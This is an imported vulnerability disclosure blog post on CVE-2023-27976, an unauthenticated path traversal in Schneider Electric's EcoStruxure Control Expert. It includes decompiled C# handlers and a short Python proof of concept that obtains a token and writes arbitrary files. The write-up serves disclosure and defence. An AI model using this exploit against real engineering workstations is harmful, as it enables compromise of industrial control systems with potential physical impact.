---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-04-11_losing-control-over-schneiders-ecostruxure-control-expert.md
original_filename: 2023-04-11_losing-control-over-schneiders-ecostruxure-control-expert.md
title: Losing control over Schneider's EcoStruxure Control Expert
category: documents
detected_topics:
- sso
- idor
- command-injection
- path-traversal
- otp
- rate-limit
tags:
- imported
- documents
- sso
- idor
- command-injection
- path-traversal
- otp
- rate-limit
language: en
raw_sha256: c9a08fd18e3f9cba1a5881609e64da0ea14cdf1aee943aa6a48d1a88334a443b
text_sha256: 3267a3740676eb7ec35228792200c5af507de99e4307b58703a4441664b0d301
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: false
---

# Losing control over Schneider's EcoStruxure Control Expert

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-04-11_losing-control-over-schneiders-ecostruxure-control-expert.md
- Source Type: markdown
- Detected Topics: sso, idor, command-injection, path-traversal, otp, rate-limit
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: False
- Raw SHA256: `c9a08fd18e3f9cba1a5881609e64da0ea14cdf1aee943aa6a48d1a88334a443b`
- Text SHA256: `3267a3740676eb7ec35228792200c5af507de99e4307b58703a4441664b0d301`


## Content

---
title: "Losing control over Schneider's EcoStruxure Control Expert"
url: "https://www.reversemode.com/2023/04/losing-control-over-schneiders.html"
final_url: "https://www.reversemode.com/2023/04/losing-control-over-schneiders.html"
authors: ["Ruben Santamarta (@reversemode)"]
programs: ["Schneider Electric"]
bugs: ["RCE", "Path traversal", "Security code review"]
publication_date: "2023-04-11"
added_date: "2023-04-27"
source: "pentester.land/writeups.json"
original_index: 1275
---

###  Losing control over Schneider's EcoStruxure Control Expert 

[ April 11, 2023  ](https://www.reversemode.com/2023/04/losing-control-over-schneiders.html "permanent link")

During Q2 2022, in view of the geopolitical situation that unfolded after the Russian invasion of Ukraine, I decided that it wouldn't do any harm to kill some bugs in some of the main players within the ICS arena. I focused in those software frameworks that are running on the engineering workstations so, if compromised, attackers would be in a privileged position to manipulate controllers logic, thus enabling sophisticated attacks with a potential physical impact (i.e triton).

I responsibly reported a bunch a unauthenticated remotely exploitable bugs to the corresponding vendors. In one case, after being ignored for months, I had to resort to the 'twitter, do your magic' approach and tweeted that I would be disclosing the issues if the situation persisted. It took just few hours for the vendor to get back to me. The positive side is that they found the bugs interesting and all that mess ended up in paid work. 

This blog post covers a similar scenario in a different vendor: I reported these issues to Schneider on June 20, (2022) which were then largely ignored for 9 months until I, once again, had to use the '0day threat' in order to get this situation 'fixed'.

Let's see how unauthenticated, remote attackers, can compromise an engineering workstation running Schneider Electric's [EcoStruxure Control Expert](https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2023-101-03&p_enDocType=Security+and+Safety+Notice&p_File_Name=SEVD-2023-101-03.pdf).

### CVE-2023-27976

CVSS v3.1 Base Score 8.8 | High | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H 

This is mainly a design issue in the Service Oriented Device Bus (SE.SODB.Host.exe). This component is a fundamental part of the Control Expert architecture, supporting its 'Topology' functionality which allows to interface with different kinds of industrial devices, including safety controllers.

'SE.SODB.Host.exe' exposes a specific set of web services, built on top a [Nancy Webserver](https://nancyfx.org/), at port 19980/TCP listening on all interfaces.

These core endpoints, which are extended by different agents (local plugins found '_C:\Program Files (x86)\Schneider Electric\Control Expert 15.1\SE.SODB\Configuration\Dll_ '), do not implement any kind of security boundary, neither follow the best-practice security patterns for securing web requests. As a result, it is possible to leverage these security weaknesses, among other things, to create arbitrary files on the victim's file system as 'NT/AUTHORITY', which can lead to an arbitrary code execution scenario.

One of those endpoints is '_Zip/{Token}_ ', which is intended to implement a functionality to exchange files.
  
  
  // SE.SODB.Host.Module.SodbModule
  using System.IO;
  using System.Runtime.CompilerServices;
  using System.Threading;
  using Nancy;
  
  public unsafe SodbModule()
  {
  Get(string.Empty, (dynamic parameters) => GetAgentStatus(), (NancyContext context) => true, "GetAgentsStatus");
  Post("Zip/{Token}", (dynamic parameters) => OnZipReceived(parameters), (NancyContext context) => true, "PostAddZip");
  Get("Alive", (dynamic parameters) => HttpStatusCode.OK, (NancyContext context) => true, "GetAlive");

  

As we see in the code above, the handler for this API is 'OnZipReceived', where 'Selector.StoreFile' is invoked.
  
  
  private dynamic OnZipReceived(dynamic parameters)
  {
  Message model = new Message
  {
  Error = new CustomError(ExceptionType.FileAccess, "OnZipReceived: no file found")
  };
  if (Request.Files.Any())
  {
  HttpFile httpFile = Request.Files.FirstOrDefault();
  if (httpFile != null)
  {
  model = Selector.StoreFile(parameters.token, httpFile.Name, httpFile.Value);
  }
  }
  return base.Response.AsJson(model);
  }

This method does not implement any validation for the 'filename' parameter, so we can easily identify a common path traversal vulnerability when 'Path.Combine' is called.
  
  
  public Message StoreFile(string token, string filename, Stream fileContents)
  {
  IAgentFunction agentFunction = null;
  Message result = new Message();
  try
  {
  agentFunction = FindFunction(token);
  if (agentFunction == null)
  {
  throw new FunctionNotFoundException("function for Token " + token + " not found - file not added");
  }
  agentFunction.Token.UploadStatus = UploadStatus.Storing;
  SelectorParameters.Log.Debug($"File {filename} for token {token} received");
  **[!!= >]** string text = Path.Combine(Path.GetTempPath(), "SODB_" + token + "_" + filename);
  using (FileStream destination = new FileStream(text, FileMode.Create))
  {
  fileContents.CopyTo(destination);
  }
  lock (locker)
  {
  SelectorParameters.Log.Debug($"ZipPath {text} updated");
  agentFunction.Token.ZipPath = text;
  agentFunction.Token.UploadStatus = UploadStatus.Ready;
  return result;
  }
  }

However, to reach that vulnerable code we firstly need to pass the 'FindFunction' check, which requires a 'Token' parameter.
  
  
  using SE.SODB.Shared.Contract.Interface;
  
  private IAgentFunction FindFunction(string token)
  {
  foreach (IAgent loadedAgent in LoadedAgents)
  {
  IAgentFunction agentFunction = loadedAgent.FunctionFromToken(token);
  if (agentFunction != null)
  {
  return agentFunction;
  }
  }
  return null;
  }

These 'tokens' are randomly generated GUID values, associated with the transactions supported by the functions implemented by the different agents (plugins).
  
  
  // SE.SODB.Shared.Contract.DataContract.Token
  using System;
  using System.Runtime.CompilerServices;
  using SE.SODB.Shared.Contract.Enumeration;
  
  public Token()
  {
  Value = Guid.NewGuid().ToString();
  base..ctor();
  FunctionType = FunctionType.Unknown;
  UploadStatus = UploadStatus.Unknown;
  CreationTime = DateTime.UtcNow;
  }

As a result, before invoking the vulnerable method we need to find a way to generate one of these valid Tokens. The logic behind this task can be found in the SE.SODB Contract (SE.SODB.Shared.*), that defines the data and interface model for the agents. First of all, these agents may implement the following functions
  
  
  // SE.SODB.Shared.Contract.Enumeration.FunctionType
  public enum FunctionType
  {
  Discovery,
  Identity,
  Locate,
  ConfApplyCs,
  ConfConsistency,
  ConfDownload,
  ConfUpload,
  FWConsistency,
  FWDownload,
  Health,
  Response,
  Unknown,
  SetPLCState,
  GetPLCState,
  GetPLCDataSet,
  DirectedProbe,
  SetPLCDataSet,
  GetPLCProtectionState,
  ReserveAndCheckPLC,
  ValidateCredentials,
  GetDeviceCertificate,
  TrustCertificate,
  GetCustomDeviceData,
  SendCommand,
  GetDeviceStatus
  }

When they are loaded, the agents register their implemented functions, for instance 'SimpleHealthAgent' ('_C:\Program Files (x86)\Schneider Electric\Control Expert 15.1\SE.SODB\Configuration\Dll\SE.SODB.SimpleHealthAgent')_
  
  
  // SE.SODB.SimpleHealthAgent.SimpleHealthAgent
  public override void RegisterFunctions()
  {
  RegisterHealth();
  RegisterIdentity();
  }

This will expose the agent's API at the corresponding URL, in this case we would have http://{controlServer_IP}:19980/SODB/Agents/SimpleHealthAgent/Health/' and http://{controlServer_IP}:19980/SODB/Agents/SimpleHealthAgent/Identity/'

We see that POST content is json-serialized
  
  
  // SE.SODB.Shared.Util.Class.WebHelper
  using System.Net.Http;
  using System.Threading.Tasks;
  using SE.SODB.Shared.Contract.DataContract;
  
  protected virtual async Task<string> Post(string url, CommunicationParameters commParams)
  {
  StringContent val = new StringContent(JsonSerialiserHelper.Serialise(commParams));
  return await (await HttpClientInstance.PostAsync(url, (HttpContent)(object)val).ConfigureAwait(continueOnCapturedContext: false)).Content.ReadAsStringAsync().ConfigureAwait(continueOnCapturedContext: false);
  }

and the 'CommunicationParameters' are as follows
  
  
  [DataContract]
  public class CommunicationParameters : IErrorProvider
  {
  [DataMember]
  public Protocol Protocol { get; set; } = Protocol.Http;
  
  [DataMember]
  public ServicesSupported ServicesSupported { get; set; }
  
  [DataMember]
  public string UserName { get; set; }
  
  [DataMember]
  public string Password { get; set; }
  
  [DataMember]
  public string Address { get; set; }
  
  [DataMember]
  public ushort Port { get; set; }
  
  [DataMember]
  public string BaseUrl { get; set; }
  
  [DataMember]
  public string FtpDirectoryPath { get; set; }
  
  [DataMember]
  public CustomError Error { get; set; }
  
  [DataMember]
  public byte UnitId { get; set; }
  
  [DataMember]
  public Dictionary<string, string> OptionalParams { get; set; }
  
  [DataMember]
  public string Key { get; set; }
  
  public CommunicationParameters()
  {
  }
  
  public CommunicationParameters(CustomError error)
  {
  Error = error;
  }
  
  public string GetFullAddress()
  {
  if (Address == null)
  {
  return null;
  }
  string text;
  if (Port <= 0)
  {
  text = Address;
  if (text == null)
  {
  return "";
  }
  }
  else
  {
  text = $"{Address}:{Port}";
  }
  return text;
  }
  }

So eventually we have all the required information to generate a valid token, which we can then use to reach the vulnerable code in the 'Zip/{token}' vulnerable endpoint. The following PoC illustrates the exploitation flow.
  
  
  import requests
  import json
  
  #Token Generation
  r = requests.post('http://localhost:19980/SODB/Agents/SimpleHealthAgent/Health/ping', 
  json={"Protocol":1,"ServicesSupported":0,"UserName":"","Password":"","Address":"127.0.0.1","Port":0,"BaseUrl":"","FtpDirectoryPath":"","Error":"","UnitId":0,"OptionalParams":"","Key":""})
  
  resp = json.loads(r.text);
  print(resp["Value"])
  
  #Exploit Path Traversal
  r=requests.post('http://localhost:19980/SODB/Zip/'+resp["Value"],files={ 'filename': ('..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\readme.pls.txt', 'This is a vulnerability')})
  
  print(r.text)

This specific vulnerability can be remotely exploited, for instance via a DNS rebinding attack scenario or if the service is exposed through the firewall. However, it should be noted that there is no default rule to allow incoming connections to this service, so it will depend on the workstation configuration. Obviously, a local process can also exploit this to escalate privileges.

Defenders should note that [Schneider Electric](https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2023-101-03&p_enDocType=Security+and+Safety+Notice&p_File_Name=SEVD-2023-101-03.pdf) has not fixed the underlying issues, but merely implemented a mitigation that forces the Service to listen on the local interface only, which still enables some attack vectors. 

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEiKizDkRgScLRA_vjUpoGvnNt78n65lSjHf4q4siURCjWOadUKPfyS9t1HDaApat7M39CbD7RkxOnUJaO6xNZuq0-SJTolKrifbLnC3UwDJvVZLDqQRn8yUHs9exFCW15-k0QU0RLZIbgxM2pD--GHQiZd8dX15TxhxRvVqFJIYh8wkDjIL2O7pfML29w=w640-h448)](https://blogger.googleusercontent.com/img/a/AVvXsEiKizDkRgScLRA_vjUpoGvnNt78n65lSjHf4q4siURCjWOadUKPfyS9t1HDaApat7M39CbD7RkxOnUJaO6xNZuq0-SJTolKrifbLnC3UwDJvVZLDqQRn8yUHs9exFCW15-k0QU0RLZIbgxM2pD--GHQiZd8dX15TxhxRvVqFJIYh8wkDjIL2O7pfML29w)

### Conclusion

If EcoStruxure Control Expert plays a significant role for your industrial processes, you better keep an eye on it, there is still a bunch of issues to be uncovered.
